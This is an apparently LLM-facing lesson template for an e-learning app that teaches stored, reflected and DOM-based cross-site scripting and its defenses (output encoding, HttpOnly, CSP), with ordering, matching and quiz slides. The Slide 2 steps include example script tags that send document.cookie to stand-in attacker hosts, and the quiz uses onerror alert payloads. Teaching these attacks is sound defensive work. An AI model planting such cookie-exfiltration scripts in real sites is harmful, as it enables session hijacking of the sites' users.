# Duofy Reusable Lesson Format: Cross-Site Scripting (XSS: Stored, Reflected, DOM) and CSP

**Target Topic:** `03_Computer_Science_and_IT / 05_Computer_Networks_and_Security / Cybersecurity_and_Defensive_Systems / Web_Application_Security_OWASP_Top_10`  
**Lesson Format Type:** `cross_site_scripting_xss_stored_reflected_dom_and_csp`  
**Architectural Rule:** EXACTLY 5 SLICES PER LESSON. Active Recall & Practice-First Pedagogy.

---

## 🎯 Pedagogical Blueprint & Objective
Guide students through the execution contexts, victim browser exploitation pipelines, and defensive header policies of Cross-Site Scripting (XSS) (OWASP Top 10 2021 A03: Injection; W3C Content Security Policy Level 3; PortSwigger Web Security Academy; Michal Zalewski *The Tangled Web* Chapter 9): contrast the **3 Primary XSS Archetypes** (**1. Stored / Persistent XSS [malicious script permanently written to backend database e.g. blog comments/profiles, executing in every viewing user's browser]**, **2. Reflected / Non-Persistent XSS [malicious script reflected off server in immediate search responses via crafted phishing links]**, and **3. DOM-Based XSS [vulnerability exists entirely in client-side JS: sources like `location.hash` / `location.search` flowing into dangerous sinks like `innerHTML`, `document.write()`, `eval()` without server involvement]**), master **XSS Defenses** (**Context-Aware Output Encoding [HTML, Attribute, JavaScript, CSS contexts]**, **`HttpOnly` Cookie Flags [blocking `document.cookie` access]**, and **Content Security Policy [CSP]** HTTP response headers restricting script origins and nonces).

---

## 📐 5-Slide Sequential Flow Table

| Slide # | Slide Function | Duofy Slide Type | Target Cognitive State | Output Data Fields Required |
| :---: | :--- | :--- | :--- | :--- |
| **Slide 1** | The 3 XSS Archetypes (Stored, Reflected, DOM), Sinks/Sources, & CSP Header Setup | `theory` | Encoding (Phase A) | `content` (Markdown + LaTeX) |
| **Slide 2** | Step-by-Step Stored XSS Attack Lifecycle from Comment Post to Cookie Exfiltration Ordering | `ordering` | Discrimination (Phase B) | `content`, `orderItems` (3-6 sequential steps) |
| **Slide 3** | XSS Variant / Defense Construct & Technical Role Matching | `matching` | Discrimination (Phase B) | `content`, `matchPairs` (3-6 pairs) |
| **Slide 4** | The Cookie Security Attribute That Prevents Client-Side JavaScript from Accessing document.cookie (HttpOnly) Blank Fill | `fill_in_blank` | Recognition (Phase B) | `content`, `blankAnswer`, `blankDistractors` |
| **Slide 5** | Analysis of Why DOM-Based XSS Does Not Involve the Backend Web Server in Exploit Delivery Quiz | `quiz` | Production (Phase C) | `content`, `options` (4 options, 1 correct) |

---

## 🤖 LLM Prompt Generation Rules & Directives

1. **Slide 1 (`theory`):** State XSS & CSP (OWASP A03; W3C CSP Level 3; PortSwigger Academy):
   - **The 3 XSS Flavors:**
     $$\begin{array}{|l|l|l|l|}
     \hline
     \textbf{XSS Type} & \textbf{Persistence} & \textbf{Execution Trigger} & \textbf{Vulnerable Component} \\
     \hline
     \mathbf{\text{Stored (Persistent)}} & \mathbf{\text{Permanent (Database)}} & \text{Viewing stored page/comment} & \text{Unsanitized database rendering} \\
     \mathbf{\text{Reflected}} & \text{Transient (URL link)} & \text{Clicking malicious phishing URL} & \text{Unencoded server reflection} \\
     \mathbf{\text{DOM-Based}} & \text{Client-Side Runtime} & \text{Client JS reads Source to Sink} & \mathbf{\text{Browser JS (e.g. innerHTML)}} \\
     \hline
     \end{array}$$
   - **DOM Sources & Sinks:**
     - **Sources:** `location.search`, `location.hash`, `document.referrer`.
     - **Execution Sinks:** `element.innerHTML`, `document.write()`, `eval()`, `setTimeout()`.
   - **Defenses:**
     - `HttpOnly` cookie flag: Blocks JavaScript access to session tokens (`document.cookie`).
     - **Content Security Policy (CSP):** `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m';`.
2. **Slide 2 (`ordering`):** Provide 5 steps of a Stored XSS attack: (1) attacker submits a forum comment containing `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`, (2) web server saves the unescaped script tag directly into the PostgreSQL comments table, (3) a legitimate admin user browses the forum page to review comments, (4) server retrieves comment from database and embeds raw HTML into the response stream, (5) victim's browser parses HTML, executes the embedded script, and transmits session cookie to attacker's server!
3. **Slide 3 (`matching`):** Pair 4 XSS concepts (Stored XSS, DOM-Based XSS, HttpOnly Cookie Flag, Content Security Policy CSP) with their definitions.
4. **Slide 4 (`fill_in_blank`):** Single sentence blank testing recall of the HttpOnly flag. Plain text only.
5. **Slide 5 (`quiz`):** Quiz on DOM-based XSS client-side mechanics: A web page contains client-side JavaScript: `let query = new URLSearchParams(window.location.search).get("name"); document.getElementById("greeting").innerHTML = query;`. An attacker lures a victim to click: `https://example.com/welcome.html?name=<img src=x onerror=alert(document.domain)>`. Why is this classified as a DOM-Based XSS attack rather than a Reflected XSS attack? (Because the vulnerable string is **parsed, read, and executed entirely on the client side inside the browser's Document Object Model (DOM)** by client-side JavaScript reading the Source (`window.location.search`) and writing to the Sink (`innerHTML`); the server receives the request for `welcome.html` as a static HTML file and **never processes, reflects, or modifies the payload**, meaning backend server-side output encoding is completely bypassed).

---

## 📋 Reusable Master JSON Template

```json
{
  "lessonType": "cross_site_scripting_xss_stored_reflected_dom_and_csp",
  "slides": [
    {
      "slideIndex": 1,
      "type": "theory",
      "content": "**Theorem: Cross-Site Scripting (XSS) & CSP Defenses**\n• **The 3 XSS Archetypes (PortSwigger Web Security Academy):**\n$$\n\\begin{array}{|l|l|l|}\n\\hline\n\\textbf{XSS Variant} & \\textbf{Persistence Mechanism} & \\textbf{Execution Vector} \\\\\n\\hline\n\\mathbf{\\text{Stored (Persistent)}} & \\mathbf{\\text{Permanent (Database / Disk)}} & \\text{Every victim who views stored comment/profile} \\\\\n\\mathbf{\\text{Reflected}} & \\text{Transient (Injected via URL query)} & \\text{Victims clicking crafted phishing links} \\\\\n\\mathbf{\\text{DOM-Based}} & \\mathbf{\\text{Client-Side Browser Memory}} & \\mathbf{\\text{JS Sources } (\\text{location.hash}) \\to \\mathbf{\\text{Sinks } (\\text{innerHTML})} \\\\\n\\hline\n\\end{array}\n$$\n• **DOM Sinks:** `innerHTML`, `document.write()`, `eval()`, `window.location`.\n• **The 3-Layer Defense:**\n  1. **Context-Aware Output Encoding:** Escape `< > \" ' &` before HTML insertion.\n  2. **`HttpOnly` Cookie Flag:** Prevents JS from reading `document.cookie`.\n  3. **Content Security Policy (CSP):** `script-src 'self' 'nonce-xyz';`"
    },
    {
      "slideIndex": 2,
      "type": "ordering",
      "content": "Order the sequential steps executed during a Stored (Persistent) Cross-Site Scripting attack from payload submission to session hijacking.",
      "orderItems": [
        "Attacker submits a blog comment containing malicious script: '<script>fetch(\"http://evil.com/\" + document.cookie)</script>'",
        "Vulnerable backend web application stores the raw unescaped script tag directly into the SQL database",
        "A victim administrator visits the blog page; web server fetches the stored comment and renders it into the response HTML",
        "Victim's web browser parses the incoming HTML document, encounters the script tag, and executes the malicious JavaScript payload",
        "Malicious script accesses victim's active session cookie via document.cookie and exfiltrates it to attacker's external server"
      ]
    },
    {
      "slideIndex": 3,
      "type": "matching",
      "content": "Match each XSS Classification / Defense to its exact Technical Mechanism.",
      "matchPairs": [
        { "left": "Stored XSS", "right": "Persistent exploit where payload is stored on backend server and executed whenever any user loads page" },
        { "left": "DOM-Based XSS", "right": "Client-side vulnerability where browser JS reads user source (location.search) and writes to dangerous sink (innerHTML)" },
        { "left": "HttpOnly Cookie Flag", "right": "Browser directive ensuring cookies cannot be read or stolen by JavaScript via document.cookie" },
        { "left": "Content Security Policy (CSP)", "right": "HTTP response header restricting the domains and cryptographic nonces from which scripts may execute" }
      ]
    },
    {
      "slideIndex": 4,
      "type": "fill_in_blank",
      "content": "The cookie security flag that prevents JavaScript from accessing session tokens via document.cookie is ___.",
      "blankAnswer": "HttpOnly",
      "blankDistractors": ["Secure", "SameSite", "Domain"]
    },
    {
      "slideIndex": 5,
      "type": "quiz",
      "content": "A static HTML page contains client-side JavaScript: let name = new URLSearchParams(window.location.search).get('user'); document.getElementById('welcome').innerHTML = name;. An attacker crafts the link: https://example.com/page.html?user=<img src=x onerror=alert(1)> and sends it to a victim. Why is this classified specifically as a DOM-Based XSS attack rather than Reflected XSS?",
      "options": [
        { "text": "The entire vulnerability lifecycle executes locally inside the victim browser's Document Object Model (DOM); the backend web server simply serves the static page.html file without ever inspecting, parsing, or reflecting the 'user' query parameter in the HTTP response body; the malicious payload flows from a client-side JavaScript Source (window.location.search) directly into an unsafe execution Sink (innerHTML) entirely within the browser", "isCorrect": true, "explanation": "Correct! This is the precise architectural distinction between Reflected and DOM-Based XSS (PortSwigger Web Security Academy; OWASP Top 10 A03). 1. **How Reflected XSS Works:** - Client sends URL `?search=<script>...` to Server. - Server backend (PHP, Python, Java) takes that string and echoes it into the HTTP response body: `<h1>Results for <script>...</h1>`. - The server is the vulnerable component. 2. **How DOM-Based XSS Works:** - Client requests `page.html?user=<img src=x onerror=alert(1)>`. - Server returns the exact same static `page.html` that it sends to everyone. The server **NEVER touches or parses the query parameter**! - The victim's browser loads the page and executes client-side JavaScript: `document.getElementById('welcome').innerHTML = name;`. - The browser's JS engine takes the unvalidated string from the DOM Source (`window.location.search`) and injects it into the DOM Sink (`innerHTML`). - The browser parses the `<img>` tag and fires the `onerror` JavaScript alert! 3. Because the server is uninvolved, server-side WAFs and server output encoding cannot prevent DOM XSS; it must be fixed in client-side code using `textContent` instead of `innerHTML`." },
        { "text": "Because DOM XSS only works on Google Chrome", "isCorrect": false, "explanation": "Incorrect." },
        { "text": "Because DOM XSS requires the user to enter their password twice", "isCorrect": false, "explanation": "Incorrect." },
        { "text": "Because Reflected XSS only affects MySQL databases", "isCorrect": false, "explanation": "Incorrect." }
      ]
    }
  ]
}
```
